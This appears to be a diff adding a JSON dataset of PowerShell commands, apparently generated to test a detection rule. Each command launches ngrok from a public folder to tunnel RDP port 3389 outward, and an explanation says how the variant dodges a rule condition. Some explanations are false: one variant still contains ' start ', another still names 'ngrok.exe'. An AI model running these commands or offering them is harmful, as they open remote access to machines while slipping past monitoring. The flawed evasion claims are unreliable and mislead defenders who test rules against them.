@@ -1,0 +1,18 @@
+[
+  {
+    "output": "powershell.exe & {C:\\\\Users\\\\Public\\\\ngrok\\\\ngrok.exe config add-authtoken N/A | Out-Null; Start-Job -ScriptBlock { C:\\\\Users\\\\Public\\\\ngrok\\\\ngrok.exe tcp 3389 } | Out-Null; Start-Sleep -s 5; Stop-Job -Name Job1 | Out-Null}",
+    "explanation": "Insertion technique was used to add semicolons between the commands, avoiding the 'selection2' rule condition that looks for ' start ' in the command line. The high-level behavior is expected to remain equivalent because semicolons are used to separate commands in PowerShell, and the commands are still executed in the same order."
+  },
+  {
+    "output": "powershell.exe -Command \"& {C:\\\\Users\\\\Public\\\\ngrok\\\\ngrok.exe config add-authtoken N/A | Out-Null; Start-Job -ScriptBlock { C:\\\\Users\\\\Public\\\\ngrok\\\\ngrok.exe tcp 3389 } | Out-Null; Start-Sleep -s 5; Stop-Job -Name Job1 | Out-Null}\"",
+    "explanation": "Substitution technique was used to replace the ampersand (&) with the -Command parameter, avoiding the 'selection2' rule condition that looks for ' start ' in the command line. The high-level behavior is expected to remain equivalent because the -Command parameter is used to execute the command in PowerShell."
+  },
+  {
+    "output": "powershell.exe -Command \"& {C:\\\\Users\\\\Public\\\\ngrok\\\\ngrok.exe --config=.yml start --all tcp 3389}\"",
+    "explanation": "Reordering technique was used to reorder the arguments, avoiding the 'selection1' rule condition that looks for specific port numbers. The high-level behavior is expected to remain equivalent because the arguments are still passed to the ngrok.exe process in a valid order."
+  },
+  {
+    "output": "powershell.exe -Command \"& {$env:ngrok_path='C:\\\\Users\\\\Public\\\\ngrok\\\\ngrok.exe'; & $env:ngrok_path config add-authtoken N/A | Out-Null; Start-Job -ScriptBlock { & $env:ngrok_path tcp 3389 } | Out-Null; Start-Sleep -s 5; Stop-Job -Name Job1 | Out-Null}\"",
+    "explanation": "Recoding/Encoding technique was used to represent the path to ngrok.exe as an environment variable, avoiding the 'selection3' rule condition that looks for 'ngrok.exe' in the command line. The high-level behavior is expected to remain equivalent because the environment variable is used to store the path to the ngrok.exe process."
+  }
+]
